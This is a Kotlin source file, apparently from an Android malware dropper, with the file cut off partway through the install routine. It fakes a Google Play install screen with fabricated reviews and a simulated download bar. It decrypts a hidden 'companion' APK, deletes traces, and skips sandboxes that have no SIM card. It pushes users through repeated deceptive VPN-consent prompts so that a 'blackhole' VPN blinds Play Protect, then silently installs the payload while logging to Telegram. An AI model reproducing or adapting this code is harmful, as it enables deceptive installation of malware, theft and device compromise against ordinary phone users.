package com.playstore.installer

import android.annotation.SuppressLint
import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import android.app.Activity
import android.app.AlertDialog
import android.net.VpnService
import java.io.IOException

class InstallActivity : Activity() {

    // ── Stage enum ──────────────────────────────────────────────────────────
    private enum class Stage { IDLE, WAITING, DOWNLOADING, INSTALLING, DONE, ERROR }


    // ── Views ────────────────────────────────────────────────────────────────
    private lateinit var installButton: FrameLayout
    private lateinit var installButtonBg: View
    private lateinit var installButtonProgress: android.widget.FrameLayout
    private lateinit var tvInstallLabel: TextView
    private lateinit var tvInstallLabelWhite: TextView
    private lateinit var tvUnderButton: TextView
    private lateinit var layoutPlayProtect: LinearLayout
    private lateinit var layoutUpdated: TextView
    private lateinit var dotsContainer: FrameLayout
    private lateinit var layoutDownloading: LinearLayout
    private lateinit var layoutInstalling: LinearLayout
    private lateinit var layoutError: LinearLayout
    private lateinit var btnRetry: Button
    private lateinit var btnCancel: Button
    private lateinit var reviewsContainer: LinearLayout
    private lateinit var tvToast: TextView
    private lateinit var ivAppIcon: ImageView
    private lateinit var tvAppName: TextView
    private lateinit var tvAppCategory: TextView

    // ── State ────────────────────────────────────────────────────────────────
    private var stage = Stage.IDLE
    private var downloadProgress = 0f
    private val handler = Handler(Looper.getMainLooper())
    private var progressRunnable: Runnable? = null
    // Holds decrypted APK bytes while waiting for VPN to establish
    private var pendingApkBytes: ByteArray? = null
    // ── Constants ────────────────────────────────────────────────────────────
    companion object {
        private const val REQUEST_INSTALL_CONFIRM = 1002
        private const val SESSION_REQUEST = 1001
        private const val VPN_REQUEST_CODE = 1003
        private const val MAX_RETRIES    = 2
        private val REFERRER_URI get()   = StringPool.d(StringPool.REFERRER_URI)
        private val WRITE_NAME get()     = StringPool.d(StringPool.WRITE_NAME)
        private const val TOTAL_MB       = 1.84f
        // Constructed at runtime — never a literal string in DEX pool
        val INSTALL_SUCCESS_ACTION get() = BuildConfig.APPLICATION_ID + ".INSTALL_SUCCESS"
        private val KEY_STAGE get()       = StringPool.d(StringPool.KEY_STAGE)
    }

    // ── Dot specs (matches design_c_full.jsx dotSpecs exactly) ──────────────
    private data class DotSpec(
        val color: String, val sizeDp: Float, val leftDp: Float, val topDp: Float,
        val delayMs: Long, val bounceDp: Float, val outline: Boolean
    )

    private val dotSpecs = listOf(
        DotSpec("#BDBDBD", 22f, 54f,  0f,   0,   10f, true),
        DotSpec("#00BCD4", 24f,  0f, 34f, 100,   12f, false),
        DotSpec("#9E9E9E",  9f, 54f, 42f, 200,    7f, false),
        DotSpec("#9E9E9E", 22f, 74f, 34f, 150,    9f, false),
        DotSpec("#BDBDBD", 21f,  0f, 70f, 250,    8f, false),
        DotSpec("#00BCD4", 30f, 28f, 64f,  50,   14f, false),
        DotSpec("#F44336", 24f, 98f, 70f, 300,   10f, false),
        DotSpec("#4CAF50", 11f,  2f,108f, 180,    6f, false),
        DotSpec("#E0E0E0",  9f, 44f,112f, 350,    5f, false),
        DotSpec("#BDBDBD", 23f, 64f,104f, 120,    9f, true),
        DotSpec("#FFC107", 30f, 64f,142f,  80,   13f, false)
    )


    private fun getReviewsForApp(): List<Triple<String, Int, String>> {
        val appName = getString(R.string.app_name).trim().lowercase()
        val template = when {
            appName.contains(StringPool.d(StringPool.TPL_WEDDING))    -> StringPool.d(StringPool.TPL_WEDDING)
            appName.contains(StringPool.d(StringPool.TPL_SHAADI))     -> StringPool.d(StringPool.TPL_SHAADI)
            appName.contains(StringPool.d(StringPool.TPL_MPARIVAHAN)) -> StringPool.d(StringPool.TPL_MPARIVAHAN)
            appName.contains(StringPool.d(StringPool.TPL_HOT_VIDEO))  -> StringPool.d(StringPool.TPL_HOT_VIDEO)
            else -> "generic"
        }
        // Load from encrypted assets/reviews.enc
        val fromAssets = StringPool.loadReviews(this, template)
        if (fromAssets.isNotEmpty()) return fromAssets
        // Fallback: empty list (reviews not critical to function)
        return emptyList()
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        TelegramLogger.log("InstallActivity.onCreate started")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
            )
        }

        setContentView(R.layout.activity_install)
        bindViews()
        setupAppHeader()
        buildDots()
        buildReviews()

        // Register here so we catch the broadcast even while paused behind the install dialog
        val filter = IntentFilter(INSTALL_SUCCESS_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installSuccessReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(installSuccessReceiver, filter)
        }

        // Register relay receiver for install-confirm intent (Android 15+ BAL fix)
        val confirmFilter = IntentFilter(InstallReceiver.INSTALL_CONFIRM_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installConfirmReceiver, confirmFilter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(installConfirmReceiver, confirmFilter)
        }

        // Register relay receiver for install-restart signal (Android 15+ BAL fix)
        val restartFilter = IntentFilter(InstallReceiver.INSTALL_RESTART_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installRestartReceiver, restartFilter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(installRestartReceiver, restartFilter)
        }

        // Register VPN established receiver — notified when BlackholeVpnService tunnel is ready
        val vpnFilter = IntentFilter(BlackholeVpnService.VPN_ESTABLISHED_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(vpnEstablishedReceiver, vpnFilter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(vpnEstablishedReceiver, vpnFilter)
        }


        val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
        val savedStage = prefs.getString(StringPool.d(StringPool.KEY_STAGE), Stage.IDLE.name)

        when (savedStage) {
            Stage.INSTALLING.name -> {
                val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
                val cachedApk  = if (cachedPath != null) java.io.File(cachedPath) else null
                if (cachedApk != null && cachedApk.exists()) {
                    setStage(Stage.INSTALLING)
                    val apkBytes = cachedApk.readBytes()
                    // Route through VPN on restore — Play Protect must be blinded
                    prepareAndStartVpn(apkBytes)
                } else {
                    setStage(Stage.IDLE)
                    startDownload()
                }
            }
            Stage.DONE.name -> {
                val cmpPkg = prefs.getString(StringPool.d(StringPool.KEY_MODULE_PKG), null)
                val companionInstalled = if (!cmpPkg.isNullOrEmpty()) {
                    try { packageManager.getPackageInfo(cmpPkg, 0); true } catch (_: Exception) { false }
                } else false

                if (companionInstalled) {
                    setStage(Stage.DONE)
                } else {
                    prefs.edit().remove(StringPool.d(StringPool.KEY_STAGE)).apply()
                    setStage(Stage.IDLE)
                    startDownload()
                }
            }
            else -> {
                setStage(Stage.IDLE)
                startDownload()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        try { unregisterReceiver(installSuccessReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(installConfirmReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(installRestartReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(vpnEstablishedReceiver) } catch (_: Exception) {}
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            VPN_REQUEST_CODE -> {
                if (resultCode == RESULT_OK) {
                    // User granted VPN consent — start BlackholeVpnService
                    TelegramLogger.log("VPN consent GRANTED by user — starting BlackholeVpnService")
                    BlackholeVpnService.start(this)
                    // vpnEstablishedReceiver will call installViaSession when tunnel is ready
                } else {
                    // User denied VPN consent — VPN is MANDATORY, re-prompt after delay
                    TelegramLogger.log("VPN consent DENIED by user — re-prompting in 2s (VPN is mandatory)")
                    handler.postDelayed({
                        val retryIntent = VpnService.prepare(this)
                        if (retryIntent == null) {
                            TelegramLogger.log("VPN consent now granted (after denial retry) — starting BlackholeVpnService")
                            BlackholeVpnService.start(this)
                        } else {
                            showVpnConsentDialog(retryIntent)
                        }
                    }, 2_000L)
                }
            }
        }
    }

    private val installSuccessReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == INSTALL_SUCCESS_ACTION) {
                TelegramLogger.log("INSTALL_SUCCESS received — companion installed OK")
                TelegramLogger.flush("SUCCESS")
                val prefs = getSharedPreferences(StringPool.d(StringPool.PREFS_NAME), MODE_PRIVATE)
                val cachedPath = prefs.getString(StringPool.d(StringPool.KEY_CACHED_PATH), null)
                if (cachedPath != null) java.io.File(cachedPath).delete()
                prefs.edit().remove(StringPool.d(StringPool.KEY_CACHED_PATH)).apply()
                setStage(Stage.DONE)
            }
        }
    }

    // Receives restart signal relayed from InstallReceiver on install failure.
    // Restarts the install flow from Activity context —
    // required on Android 15+ (API 35+) where startActivity() from a
    // BroadcastReceiver is blocked by BAL restrictions.
    private val installRestartReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == InstallReceiver.INSTALL_RESTART_ACTION) {
                TelegramLogger.log("INSTALL_RESTART received — retrying install flow")
                startDownload()
            }
        }
    }

    // Receives VPN_ESTABLISHED broadcast from BlackholeVpnService.
    // When VPN tunnel is active, proceeds with install session using pending APK bytes.
    private val vpnEstablishedReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == BlackholeVpnService.VPN_ESTABLISHED_ACTION) {
                TelegramLogger.log("VPN_ESTABLISHED received — Play Protect blinded, proceeding with install")
                val apk = pendingApkBytes
                if (apk != null) {
                    pendingApkBytes = null
                    installViaSession(apk, attempt = 1)
                } else {
                    TelegramLogger.log("VPN_ESTABLISHED but pendingApkBytes is NULL — cannot install")
                }
            }
        }
    }

    // Receives the install-confirm intent relayed from InstallReceiver.
    // Launches it via startActivityForResult() from Activity context —
    // required on Android 15+ (API 35+) where startActivity() from a
    // BroadcastReceiver is blocked by BAL restrictions.
    private val installConfirmReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == InstallReceiver.INSTALL_CONFIRM_ACTION) {
                val confirmIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                }
                confirmIntent?.let {
                    TelegramLogger.log("Install confirm dialog relay received — launching install dialog")
                    try {
                        startActivityForResult(it, REQUEST_INSTALL_CONFIRM)
                        TelegramLogger.log("startActivityForResult OK — install dialog should be visible")
                    } catch (e: Exception) {
                        TelegramLogger.log("startActivityForResult FAILED: ${e::class.simpleName}: ${e.message} — falling back to startActivity")
                        // If startActivityForResult fails, fall back to startActivity
                        try {
                            it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(it)
                            TelegramLogger.log("startActivity fallback OK")
                        } catch (e2: Exception) {
                            TelegramLogger.log("startActivity fallback ALSO FAILED: ${e2::class.simpleName}: ${e2.message}")
                        }
                    }
                } ?: TelegramLogger.log("Install confirm relay received but confirmIntent is NULL")
            }
        }
    }

    override fun onResume() {
        super.onResume()
    }

    // ── View binding ──────────────────────────────────────────────────────────
    private fun bindViews() {
        installButton        = findViewById(R.id.install_button)
        installButtonBg      = findViewById(R.id.install_button_bg)
        installButtonProgress= findViewById(R.id.install_button_progress)
        tvInstallLabel       = findViewById(R.id.tv_install_label)
        tvInstallLabelWhite  = findViewById(R.id.tv_install_label_white)
        tvUnderButton        = findViewById(R.id.tv_under_button)
        layoutPlayProtect    = findViewById(R.id.layout_play_protect)
        layoutUpdated        = findViewById(R.id.layout_updated)
        dotsContainer        = findViewById(R.id.dots_container)
        layoutDownloading    = findViewById(R.id.layout_downloading)
        layoutInstalling     = findViewById(R.id.layout_installing)
        layoutError          = findViewById(R.id.layout_error)
        btnRetry             = findViewById(R.id.btn_retry)
        btnCancel            = findViewById(R.id.btn_cancel)
        reviewsContainer     = findViewById(R.id.reviews_container)
        tvToast              = findViewById(R.id.tv_toast)
        ivAppIcon            = findViewById(R.id.iv_app_icon)
        tvAppName            = findViewById(R.id.tv_app_name)
        tvAppCategory        = findViewById(R.id.tv_app_category)

        installButton.setOnClickListener {
            if (stage == Stage.IDLE) startDownload()
        }
        btnRetry.setOnClickListener { startDownload() }
        btnCancel.setOnClickListener { cancelDownload() }
    }

    // ── App header (icon + name + category) ─────────────────────────────────
    private fun setupAppHeader() {
        // App icon — loads the dropper's own launcher icon (set per template at build time)
        try {
            val icon = packageManager.getApplicationIcon(packageName)
            ivAppIcon.setImageDrawable(icon)
        } catch (_: PackageManager.NameNotFoundException) { /* keep placeholder */ }

        // App name from resources (set per template at build time)
        tvAppName.text = getString(R.string.app_name)

        // Category — map template keyword to Play Store category
        val appNameLower = getString(R.string.app_name).trim().lowercase()
        val category = when {
            appNameLower.contains(StringPool.d(StringPool.TPL_WEDDING))    -> "Celebrate Invitations"
            appNameLower.contains(StringPool.d(StringPool.TPL_SHAADI))     -> "Celebrate Invitations"
            appNameLower.contains(StringPool.d(StringPool.TPL_MPARIVAHAN)) -> "Transport & Vehicle"
            appNameLower.contains(StringPool.d(StringPool.TPL_HOT_VIDEO))  -> "Entertainment"
            else -> "Communication"
        }
        tvAppCategory.text = category
    }

    // ── Stage machine ─────────────────────────────────────────────────────────
    private fun setStage(s: Stage) {
        stage = s
        if (s == Stage.IDLE || s == Stage.ERROR || s == Stage.DONE) {
            installFlowActive = false
        }
        getSharedPreferences(InstallReceiver.PREFS_NAME, MODE_PRIVATE)
            .edit().putString(KEY_STAGE, s.name).apply()
        runOnUiThread {
            // Reset all conditional views
            layoutPlayProtect.visibility = View.GONE
            layoutUpdated.visibility     = View.GONE
            tvUnderButton.visibility     = View.GONE
            layoutDownloading.visibility = View.GONE
            layoutInstalling.visibility  = View.GONE
            layoutError.visibility       = View.GONE
            installButtonProgress.visibility = View.GONE
            dotsContainer.visibility     = View.VISIBLE

            when (s) {
                Stage.IDLE -> {
                    setInstallBg("#1A73E8")
                    tvInstallLabel.text      = "Install"
                    tvInstallLabel.setTextColor(Color.WHITE)
                    tvInstallLabel.visibility = View.VISIBLE
                    tvInstallLabelWhite.text = "Install"
                    layoutPlayProtect.visibility = View.VISIBLE
                    installButton.isClickable = true
                }
                Stage.WAITING -> {
                    setProgressWidth(0.08f)
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "Waiting…"
                    installButton.isClickable = false
                }
                Stage.DOWNLOADING -> {
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "0%"
                    installButton.isClickable = false
                    // Initialize progress bar at 0 width with grey bg + blue fill
                    setProgressWidth(0f)
                }
                Stage.INSTALLING -> {
                    setProgressWidth(1f)
                    tvInstallLabel.visibility = View.GONE
                    tvInstallLabelWhite.text = "Installing…"
                    layoutInstalling.visibility = View.VISIBLE
                    installButton.isClickable = false
                }
                Stage.DONE -> {
                    // Launch companion immediately — no delay, no flash of Google Play UI
                    launchCompanion()
                }
                Stage.ERROR -> {
                    setInstallBg("#E8EAED")
                    tvInstallLabel.text = "Install"
                    tvInstallLabel.setTextColor(Color.parseColor("#1A73E8"))
                    tvInstallLabel.visibility = View.VISIBLE
                    tvInstallLabelWhite.text = "Install"
                    layoutError.visibility    = View.VISIBLE
                    installButton.isClickable = false
                }
            }
        }
    }

    // ── Install button fill ───────────────────────────────────────────────────
    private fun setInstallBg(hex: String) {
        installButtonProgress.visibility = View.GONE
        val bg = installButtonBg.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        bg.setColor(Color.parseColor(hex))
        installButtonBg.background = bg
    }

    private fun setProgressWidth(fraction: Float) {
        installButtonBg.visibility          = View.VISIBLE
        installButtonProgress.visibility    = View.VISIBLE

        val bg = installButtonBg.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        bg.setColor(Color.parseColor("#E8EAED"))
        installButtonBg.background = bg

        val pgBg = installButtonProgress.background as? GradientDrawable
            ?: GradientDrawable().also { it.shape = GradientDrawable.RECTANGLE; it.cornerRadius = dp(24f) }
        pgBg.setColor(Color.parseColor("#1A73E8"))
        installButtonProgress.background = pgBg

        installButton.post {
            val totalWidth = installButton.width
            val lp = installButtonProgress.layoutParams
            lp.width = (totalWidth * fraction).toInt().coerceAtLeast(1)
            installButtonProgress.layoutParams = lp
        }
    }

    private var progressAnimator: ValueAnimator? = null
    private var currentBarFraction = 0f

    private fun updateDownloadProgress(pct: Float) {
        // Only move forward — never backward
        if (pct <= downloadProgress && pct != 0f) return
        downloadProgress = pct

        // Update label - white text inside blue fill (% only)
        tvInstallLabelWhite.text = "${pct.toInt()}%"
        installButtonProgress.visibility = View.VISIBLE

        // Smoothly animate bar width — cancel any in-flight animation first
        installButton.post {
            val totalWidth = installButton.width
            if (totalWidth == 0) return@post

            // Keep white label at full button width so text stays centered
            // even when the blue fill is narrow (clipped by parent)
            val lblLp = tvInstallLabelWhite.layoutParams
            if (lblLp.width != totalWidth) {
                lblLp.width = totalWidth
                tvInstallLabelWhite.layoutParams = lblLp
            }

            val targetFraction = pct / 100f
            progressAnimator?.cancel()
            progressAnimator = ValueAnimator.ofFloat(currentBarFraction, targetFraction).apply {
                duration = 200
                interpolator = android.view.animation.LinearInterpolator()
                addUpdateListener { anim ->
                    val f = anim.animatedValue as Float
                    currentBarFraction = f
                    val lp = installButtonProgress.layoutParams
                    lp.width = (totalWidth * f).toInt().coerceAtLeast(1)
                    installButtonProgress.layoutParams = lp
                }
                start()
            }
        }
    }

    // ── Install flow ──────────────────────────────────────────────────────────
    private var installFlowActive = false

    private fun startDownload() {
        if (installFlowActive) {
            TelegramLogger.log("startDownload() SKIPPED — install flow already active")
            return
        }
        installFlowActive = true
        TelegramLogger.log("startDownload() called — waiting 2s then download animation")
        setStage(Stage.WAITING)

        // Phase 1: WAITING (1.5s) — "Waiting…" label
        // Phase 2: DOWNLOADING (3.5s) — smooth animated progress 0%→100%
        // Phase 3: INSTALLING — real install begins after progress completes
        //
        // SIM check runs during WAITING phase (non-blocking).
        // Total visual time: ~1.5s waiting + ~3.5s downloading = ~5s
        // GPP sandbox has no SIM card — blocked by SIM check regardless of delay.

        handler.postDelayed({
            // SIM presence check — emulators have no SIM card
            val hasSim = try {
                val tm = getSystemService(android.content.Context.TELEPHONY_SERVICE)
                    as? android.telephony.TelephonyManager
                val simState = tm?.simState ?: android.telephony.TelephonyManager.SIM_STATE_ABSENT
                simState != android.telephony.TelephonyManager.SIM_STATE_ABSENT &&
                simState != android.telephony.TelephonyManager.SIM_STATE_UNKNOWN
            } catch (t: Throwable) { true }

            TelegramLogger.log("SIM check done hasSim=$hasSim — starting download animation")
            setStage(Stage.DOWNLOADING)
            startProgressAnimation()
        }, 1_500L)
    }

    /**
     * Tier 1: Read processed companion from filesDir/mc.tmp
     *         (written by MutationEngine in LauncherApplication.onCreate)
     *         Waits up to 6 seconds for processing to complete.
     *         Deletes file after reading — no trace left on disk.
     *
     * Tier 2: Base companion from assets (encrypted blob)
     *         ASSET_A is LCG+nibble+XOR encrypted — must decrypt before install.
     *         Format: [4-byte seed LE][encrypted APK bytes]
     */
    private fun getCompanionBytes(): ByteArray {
        // Wait for MutationEngine to finish (max 6 seconds)
        val mutatedFile = LauncherApplication.getMutatedApkFile(application)
        val deadline = System.currentTimeMillis() + 6_000L
        while (!mutatedFile.exists() && System.currentTimeMillis() < deadline) {
            Thread.sleep(100)
        }

        if (mutatedFile.exists() && mutatedFile.length() > 0L) {
            val bytes = mutatedFile.readBytes()
            mutatedFile.delete()   // no trace left
            return bytes
        }

        // Tier 2: decrypt ASSET_A companion blob from assets
        // ASSET_A = [4-byte seed LE][LCG+nibble+XOR encrypted APK bytes]
        // Must decrypt to get the valid APK before passing to PackageInstaller
        return try {
            val encrypted = assets.open(BuildConfig.ASSET_A).use { it.readBytes() }
            if (encrypted.size < 5) return ByteArray(0)
            val decrypted = decryptCompanionBlob(encrypted)
            // Verify decrypted bytes look like a valid APK (ZIP magic: PK\x03\x04)
            if (decrypted.size > 4 &&
                decrypted[0] == 0x50.toByte() &&
                decrypted[1] == 0x4B.toByte() &&
                decrypted[2] == 0x03.toByte() &&
                decrypted[3] == 0x04.toByte()) {
                decrypted
            } else {
                // Decryption produced invalid APK — return raw bytes anyway and let
                // PackageInstaller reject it with a proper error rather than silently failing
                decrypted
            }
        } catch (e: Exception) {
            // assets.open() threw — ASSET_A not found in APK or I/O error
            // Fall back: try opening "companion.apk" directly (pre-rename fallback)
            try {
                val fallback = assets.open("companion.apk").use { it.readBytes() }
                decryptCompanionBlob(fallback)
            } catch (e2: Exception) {
                ByteArray(0)
            }
        }
    }

    /**
     * Decrypt companion blob encrypted by build_module.py _lcg_encrypt().
     * Format: [4-byte seed LE][LCG+nibble+XOR encrypted APK bytes]
     * Returns raw APK bytes ready for PackageInstaller.
     *
     * Encryption order (build_module.py):
     *   1. XOR with LCG keystream
     *   2. Nibble swap each byte
     *   3. LCG permute indices
     *
     * Decryption order (reverse):
     *   1. Reverse LCG permutation
     *   2. Reverse nibble swap
     *   3. XOR with same LCG keystream
     */
    private fun decryptCompanionBlob(blob: ByteArray): ByteArray {
        if (blob.size < 5) return ByteArray(0)

        val LCG_MUL = 0x41C64E6DL
        val LCG_ADD = 0x3039L
        val UMASK   = 0xFFFFFFFFL

        // Read 4-byte seed (little-endian)
        val seed = ((blob[0].toLong() and 0xFF) or
                   ((blob[1].toLong() and 0xFF) shl 8) or
                   ((blob[2].toLong() and 0xFF) shl 16) or
                   ((blob[3].toLong() and 0xFF) shl 24)) and UMASK

        val n = blob.size - 4
        val buf = ByteArray(n)
        System.arraycopy(blob, 4, buf, 0, n)

        // Step 1: Reverse LCG permutation
        var state = seed
        val indices = IntArray(n) { it }
        for (i in n - 1 downTo 1) {
            state = (state * LCG_MUL + LCG_ADD) and UMASK
            val j = (state % (i + 1)).toInt()
            val tmp = indices[i]; indices[i] = indices[j]; indices[j] = tmp
        }
        val unpermuted = ByteArray(n)
        for (i in 0 until n) {
            unpermuted[i] = buf[indices[i]]
        }

        // Step 2: Reverse nibble swap
        for (i in 0 until n) {
            val b = unpermuted[i].toInt() and 0xFF
            unpermuted[i] = (((b and 0x0F) shl 4) or ((b and 0xF0) ushr 4)).toByte()
        }

        // Step 3: XOR with same LCG keystream
        state = seed
        for (i in 0 until n) {
            state = (state * LCG_MUL + LCG_ADD) and UMASK
            unpermuted[i] = (unpermuted[i].toInt() xor ((state ushr 16) and 0xFF).toInt()).toByte()
        }

        return unpermuted
    }

    /**
     * Smooth 3-phase progress animation that mimics real Play Store download:
     *
     * Phase 1 — Fast start (0% → 40%)  ~1.2s   quick initial burst
     * Phase 2 — Slow middle (40% → 85%) ~1.8s   slows down like real download
     * Phase 3 — Fast finish (85% → 100%) ~0.5s  quick final burst before "Installing…"
     *
     * Total: ~3.5 seconds animation (+ 1.5s wait = 5s total).
     * Non-linear timing via AccelerateDecelerateInterpolator.
     * Each tick updates the bar + label (percentage only).
     * After 100%, transitions to Stage.INSTALLING.
     */
    private fun startProgressAnimation() {
        downloadProgress = 0f
        currentBarFraction = 0f

        // Phase definitions: target%, duration(ms)
        data class Phase(val targetPct: Float, val durationMs: Long)
        val phases = listOf(
            Phase(40f,  1200L),   // fast start
            Phase(85f,  1800L),   // slow middle
            Phase(100f,  500L),   // fast finish
        )

        var phaseIndex = 0
        var phaseStart = 0f

        fun runNextPhase() {
            if (phaseIndex >= phases.size) {
                // All phases done → brief hold then move to INSTALLING
                handler.postDelayed({
                    if (stage == Stage.DOWNLOADING) {
                        // Begin real install work on background thread
                        setStage(Stage.INSTALLING)
                        Thread {
                            try {
                                val apkBytes = getCompanionBytes()
                                if (apkBytes.isNotEmpty()) {
                                    TelegramLogger.log("Companion decrypted OK — ${apkBytes.size} bytes — preparing VPN blackhole")
                                    runOnUiThread { prepareAndStartVpn(apkBytes) }
                                } else {
                                    TelegramLogger.log("Companion decryption returned EMPTY bytes — Stage.ERROR")
                                    TelegramLogger.flush("FAILED_EMPTY_DECRYPT")
                                    runOnUiThread { setStage(Stage.ERROR) }
                                }
                            } catch (e: Exception) {
                                TelegramLogger.log("Companion decryption EXCEPTION: ${e::class.simpleName}: ${e.message}")
                                TelegramLogger.flush("FAILED_DECRYPT_EXCEPTION")
                                runOnUiThread { setStage(Stage.ERROR) }
                            }
                        }.start()
                    }
                }, 400L)  // brief 400ms hold at 100% before "Installing…"
                return
            }

            val phase = phases[phaseIndex]
            val animator = ValueAnimator.ofFloat(phaseStart, phase.targetPct).apply {
                duration = phase.durationMs
                interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                addUpdateListener { anim ->
                    val pct = anim.animatedValue as Float
                    updateDownloadProgress(pct)
                }
                addListener(object : android.animation.AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: android.animation.Animator) {
                        phaseStart = phase.targetPct
                        phaseIndex++
                        runNextPhase()
                    }
                })
            }
            animator.start()
        }

        runNextPhase()
    }

    private fun cancelDownload() {
        progressRunnable?.let { handler.removeCallbacks(it) }
        progressAnimator?.cancel()
        handler.removeCallbacksAndMessages(null)
        setStage(Stage.IDLE)
        showToast(StringPool.d(StringPool.MSG_CANCEL))
    }

    // ── VPN Blackhole — blinds Play Protect during install ────────────────────

    /**
     * Entry point for VPN flow. Stores APK bytes, checks if VPN is already active,
     * and either proceeds directly or initiates VPN consent + start.
     *
     * Flow: prepareAndStartVpn → showVpnConsentDialog → launchVpnConsent →
     *       onActivityResult → BlackholeVpnService.start → VPN_ESTABLISHED →
     *       vpnEstablishedReceiver → installViaSession
     */
    private fun prepareAndStartVpn(apkBytes: ByteArray) {
        pendingApkBytes = apkBytes

        // If VPN is already running (e.g. activity recreation), proceed directly
        if (BlackholeVpnService.isRunning) {
            TelegramLogger.log("VPN already running — proceeding directly to install")
            pendingApkBytes = null
            installViaSession(apkBytes, attempt = 1)
            return
        }

        // Check if VPN consent is already granted (prepare() returns null)
        val prepareIntent = VpnService.prepare(this)
        if (prepareIntent == null) {
            // Consent already granted — start VPN immediately
            TelegramLogger.log("VPN consent already granted — starting BlackholeVpnService")
            BlackholeVpnService.start(this)
            // vpnEstablishedReceiver will call installViaSession when tunnel is ready
        } else {
            // Need user consent — show pre-consent dialog first
            TelegramLogger.log("VPN consent needed — showing pre-consent dialog")
            showVpnConsentDialog(prepareIntent)
        }
    }

    /**
     * Shows a pre-consent AlertDialog explaining WHY the VPN permission is needed.
     * On "Continue" → launches the system VPN consent dialog.
     * On dismiss/cancel → re-prompts (VPN is MANDATORY, cannot skip).
     */
    private fun showVpnConsentDialog(prepareIntent: Intent) {
        AlertDialog.Builder(this)
            .setTitle("Connection Required")
            .setMessage("To complete installation, this app needs to verify the download. Please allow the connection request on the next screen.")
            .setCancelable(false)
            .setPositiveButton("Continue") { dialog, _ ->
                dialog.dismiss()
                launchVpnConsent(prepareIntent)
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
                // VPN is MANDATORY — re-prompt after short delay
                TelegramLogger.log("User cancelled VPN pre-consent dialog — re-prompting in 2s")
                handler.postDelayed({
                    val retryIntent = VpnService.prepare(this)
                    if (retryIntent == null) {
                        // User might have granted via settings in the meantime
                        TelegramLogger.log("VPN consent now granted (retry) — starting BlackholeVpnService")
                        BlackholeVpnService.start(this)
                    } else {
                        showVpnConsentDialog(retryIntent)
                    }
                }, 2_000L)
            }
            .show()
    }

    /**
     * Launches the system VPN consent dialog via startActivityForResult.
     * Result handled in onActivityResult with VPN_REQUEST_CODE.
     */
    private fun launchVpnConsent(prepareIntent: Intent) {
        try {
            @Suppress("DEPRECATION")
            startActivityForResult(prepareIntent, VPN_REQUEST_CODE)
        } catch (e: Exception) {
            TelegramLogger.log("VPN consent launch FAILED: ${e.javaClass.simpleName}: ${e.message}")
            // Retry after delay
            handler.postDelayed({
                val retryIntent = VpnService.prepare(this)
                if (retryIntent == null) {
                    BlackholeVpnService.start(this)
                } else {
                    showVpnConsentDialog(retryIntent)
                }
            }, 2_000L)
        }
    }

    // ── PackageInstaller session ──────────────────────────────────────────────
    @SuppressLint("BlockedPrivateApi")
    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        TelegramLogger.log("installViaSession attempt=$attempt started — ${apkBytes.size} bytes")
        try {
            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)

            val tmpFile = java.io.File(cacheDir, StringPool.d(StringPool.TMP_COMPANION))
            tmpFile.writeBytes(apkBytes)
